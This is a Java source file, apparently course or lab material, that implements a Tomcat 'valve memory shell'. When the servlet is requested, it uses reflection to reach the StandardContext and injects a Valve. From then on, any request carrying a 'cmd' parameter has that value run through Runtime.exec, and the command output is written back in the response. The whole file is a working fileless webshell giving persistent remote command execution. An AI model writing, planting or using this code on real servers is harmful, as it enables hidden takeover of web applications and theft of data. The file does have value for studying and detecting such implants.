package lagou.edu.servlet;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.valves.ValveBase;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;

public class addValve_ extends HttpServlet {
    /**
     * valve内存马的具体实现
     */
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException, ServletException {
        this.doGet(req, resp);
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        ServletContext servletContext = req.getSession().getServletContext();
        StandardContext o = null;
        while (o == null) {
            Field f = null;
            Object object = null;
            try {
                f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                object = f.get(servletContext);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                e.printStackTrace();
            }
            if (object instanceof ServletContext) {
                servletContext = (ServletContext) object;
            } else if (object instanceof StandardContext) {
                o = (StandardContext) object;
            }
        }

        o.addValve((Valve) new shellValve());
    }
}
/*class TestValve extends ValveBase {
    public TestValve() {
    }

    public void invoke(Request request, Response response) throws IOException, ServletException {
        String cmd = request.getParameter("cmd");
        if (cmd != null && !cmd.equals("")) {
            response.getWriter().println("I come here first!");
        }else {
            getNext().invoke(request, response);
        }

    }
}*/

class shellValve extends ValveBase {
    public shellValve(){

    }
    @Override
    public void invoke(Request request, Response response) throws IOException {
        try {
            String cmd = request.getParameter("cmd");
            if (cmd != null && !cmd.equals("")) {
                Runtime runtime = Runtime.getRuntime();
                InputStream inputStream = runtime.exec(cmd).getInputStream();
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                byte[] bytes = new byte[1024];
                int a = -1;
                while ((a = inputStream.read(bytes)) != -1) {
                    outputStream.write(bytes, 0, a);
                }
                response.getWriter().println(new String(outputStream.toByteArray()));
            }else {
                getNext().invoke(request, response);
            }
        }catch (Exception e){
            try {
                getNext().invoke(request, response);
            } catch (ServletException servletException) {
                servletException.printStackTrace();
            }
        }
    }
}
